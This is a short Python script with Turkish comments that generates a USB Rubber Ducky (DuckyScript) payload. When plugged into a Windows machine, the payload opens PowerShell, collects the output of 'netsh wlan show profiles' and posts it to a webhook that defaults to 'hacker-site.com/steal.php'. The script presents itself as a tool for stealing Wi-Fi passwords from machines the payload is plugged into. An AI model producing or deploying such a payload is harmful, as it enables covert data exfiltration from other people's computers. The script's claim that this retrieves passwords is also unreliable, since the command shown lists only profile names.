print("--- RUBBER DUCKY PAYLOAD GENERATOR ---")
print("Bu kod, bir USB takıldığında 1 saniyede çalışacak saldırı kodunu üretir.")

webhook_url = input("Bilgilerin geleceği Webhook URL (veya enter bas): ")
if not webhook_url: webhook_url = "http://hacker-site.com/steal.php"

# DuckyScript (Klavye gibi davranan kod)
payload = f"""
DELAY 1000
GUI r
DELAY 500
STRING powershell
ENTER
DELAY 1000
STRING $wifi = (netsh wlan show profiles) | Out-String;
STRING Invoke-WebRequest -Uri "{webhook_url}" -Method Post -Body $wifi
ENTER
"""

with open("payload.txt", "w") as f:
    f.write(payload)

print(f"\n✅ 'payload.txt' oluşturuldu!")
print("Bunu bir Digispark/Rubber Ducky USB'sine yüklersen, takıldığı an Wifi şifrelerini sana yollar.")